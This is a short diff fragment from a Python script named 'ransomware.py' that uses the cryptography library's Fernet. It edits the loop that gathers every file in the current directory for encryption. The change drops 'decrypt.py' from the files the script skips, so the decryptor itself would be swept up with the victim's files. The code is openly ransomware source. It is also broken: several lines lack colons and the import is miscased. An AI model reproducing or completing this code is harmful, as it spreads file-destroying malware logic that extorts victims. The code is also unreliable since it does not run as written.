@@ -9,9 +9,9 @@ from cryptography.fernet import fernet
 
 files = []
 
-# Ignores the encryptor, decryptor and key from encryption/decryption.
+# Ignores the encryptor, decryptor and key from encryption
 for file in os.listdir()
-    if file == "ransomware.py" or file =="key.key" or file == "decrypt.py":
+    if file == "ransomware.py" or file =="key.key":
         continue
     if os.path.isfile(file)
         files.append(file)
